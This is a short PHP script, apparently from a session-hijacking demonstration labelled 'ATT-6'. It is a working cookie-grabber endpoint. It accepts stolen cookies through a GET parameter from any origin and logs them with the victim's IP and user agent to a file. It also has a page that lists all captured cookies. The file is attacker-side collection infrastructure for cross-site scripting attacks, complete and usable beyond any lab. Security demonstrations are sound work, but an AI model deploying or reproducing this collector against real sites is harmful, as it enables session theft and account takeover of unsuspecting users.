<?php
// Simple data grabber for ATT-6 (Session Hijacking) demonstration
// This script saves stolen cookies to a file

header('Access-Control-Allow-Origin: *');

$cookie = $_GET['cookie'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

if (!empty($cookie)) {
    $logEntry = date('Y-m-d H:i:s') . " | IP: $ip | Cookie: $cookie | UA: $ua\n";
    file_put_contents('/tmp/stolen_cookies.txt', $logEntry, FILE_APPEND);
    echo "OK";
} else {
    // Show collected cookies
    echo "<h2>Stolen Cookies Log</h2><pre>";
    if (file_exists('/tmp/stolen_cookies.txt')) {
        echo htmlspecialchars(file_get_contents('/tmp/stolen_cookies.txt'));
    } else {
        echo "No cookies captured yet.";
    }
    echo "</pre>";
}
